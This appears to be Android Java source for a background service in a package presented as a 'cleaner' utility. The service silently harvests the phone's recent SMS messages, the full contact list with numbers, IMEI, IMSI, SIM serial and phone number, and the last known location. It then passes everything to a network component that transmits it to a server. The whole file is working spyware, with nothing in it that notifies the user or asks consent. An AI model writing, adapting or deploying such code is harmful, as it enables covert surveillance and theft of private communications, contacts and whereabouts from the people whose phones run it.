package com.utility.cleanerapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.location.LocationManager;
import android.content.ContentResolver;
import android.database.Cursor;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;
import java.util.ArrayList;
import java.util.HashMap;

public class DataCollectionService extends Service {
    
    private static final String TAG = "DataCollectionService";
    private ArrayList<HashMap<String, String>> collectedData;
    private LocationManager locationManager;
    private String currentLocation = "";
    
    @Override
    public void onCreate() {
        super.onCreate();
        collectedData = new ArrayList<>();
        Log.d(TAG, "Service created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Starting data collection");
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                collectSmsMessages();
                collectContacts();
                collectDeviceInfo();
                collectLocation();
                sendDataToServer();
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void collectSmsMessages() {
        try {
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                new String[] {"address", "body", "date", "type"},
                null,
                null,
                "date DESC LIMIT 100"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    HashMap<String, String> smsData = new HashMap<>();
                    smsData.put("type", "SMS");
                    smsData.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    smsData.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsData.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    collectedData.add(smsData);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            Log.d(TAG, "SMS collection completed: " + collectedData.size() + " messages");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS: " + e.getMessage());
        }
    }
    
    private void collectContacts() {
        try {
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    HashMap<String, String> contactData = new HashMap<>();
                    contactData.put("type", "CONTACT");
                    contactData.put("id", contactId);
                    contactData.put("name", displayName);
                    
                    // Get phone numbers
                    if (cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                        );
                        
                        if (phoneCursor != null && phoneCursor.moveToFirst()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contactData.put("phone", phoneNumber);
                            phoneCursor.close();
                        }
                    }
                    
                    collectedData.add(contactData);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            Log.d(TAG, "Contacts collection completed");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts: " + e.getMessage());
        }
    }
    
    private void collectDeviceInfo() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            HashMap<String, String> deviceData = new HashMap<>();
            deviceData.put("type", "DEVICE_INFO");
            deviceData.put("imei", telephonyManager.getDeviceId());
            deviceData.put("imsi", telephonyManager.getSubscriberId());
            deviceData.put("phone_number", telephonyManager.getLine1Number());
            deviceData.put("network_operator", telephonyManager.getNetworkOperatorName());
            deviceData.put("sim_serial", telephonyManager.getSimSerialNumber());
            
            collectedData.add(deviceData);
            Log.d(TAG, "Device info collection completed");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage());
        }
    }
    
    private void collectLocation() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastKnownLocation == null) {
                lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (lastKnownLocation != null) {
                HashMap<String, String> locationData = new HashMap<>();
                locationData.put("type", "LOCATION");
                locationData.put("latitude", String.valueOf(lastKnownLocation.getLatitude()));
                locationData.put("longitude", String.valueOf(lastKnownLocation.getLongitude()));
                locationData.put("accuracy", String.valueOf(lastKnownLocation.getAccuracy()));
                locationData.put("timestamp", String.valueOf(lastKnownLocation.getTime()));
                
                collectedData.add(locationData);
                currentLocation = lastKnownLocation.getLatitude() + "," + lastKnownLocation.getLongitude();
            }
            
            Log.d(TAG, "Location collection completed");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting location: " + e.getMessage());
        }
    }
    
    private void sendDataToServer() {
        try {
            Log.d(TAG, "Sending " + collectedData.size() + " data items to server");
            NetworkManager networkManager = new NetworkManager(this);
            networkManager.transmitData(collectedData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending data to server: " + e.getMessage());
        }
    }
}